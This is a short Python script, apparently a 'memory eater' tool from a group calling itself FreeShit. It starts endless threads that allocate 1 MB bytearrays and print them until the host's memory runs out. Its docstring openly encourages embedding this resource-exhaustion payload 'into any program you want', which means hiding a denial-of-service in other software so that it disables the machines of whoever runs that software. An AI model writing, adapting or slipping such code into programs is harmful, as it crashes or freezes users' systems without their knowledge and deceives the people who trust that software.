from random import randrange
import threading
from pystyle import Colorate, Colors
"""
This simple program simply just Eat all the memory someone has.
I commented most of the code so you can understand how this program works and actually integrate
this memory eater properly into any program you want, as you can see i made the
thread reading threads a lot more, the amount of additional threads for reading the data 
is basically just the power of 2 compared to the data writing threads

"""


print(Colorate.Vertical(Colors.red_to_yellow, """
                ███████╗██████╗ ███████╗███████╗███████╗██╗  ██╗██╗████████╗
                ██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝██║  ██║██║╚══██╔══╝  
                █████╗  ██████╔╝█████╗  █████╗  ███████╗███████║██║   ██║      
                ██╔══╝  ██╔══██╗██╔══╝  ██╔══╝  ╚════██║██╔══██║██║   ██║    
                ██║     ██║  ██║███████╗███████╗███████║██║  ██║██║   ██║     
                ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    
                Created By FreeShit ║ Develepor Chargonium#8203 ║ getfreeshit.today


""",1))

list = []

data = 1024*1024 #The amount of data each bytearray is going to hold

def MemoryReader(): #This function will force python to keep the memory in the memory inside the actual memory and doesnt put the data in the cache
    while True:
        for bytearrayData in list:
            bytearrayData: bytearray
            print(bytearrayData)

def MemoryWriter(): #This functions writes all of the data to the list
    while True:
        list.append(bytearray(data))

Threads = []

ThreadsAmount = 10 #This is the amount of threads to start, it is reccomended to put this at a minimum of 3

for i in range(ThreadsAmount): #This creates the threads for writing the memory
    Thread1 = threading.Thread(target=MemoryWriter)
    Thread1.start()
    Threads.append(Thread1)
    for j in range(ThreadsAmount): #This creates the threads for reading the memory
        Thread2 = threading.Thread(target=MemoryReader)
        Thread2.start()
        Threads.append(Thread2)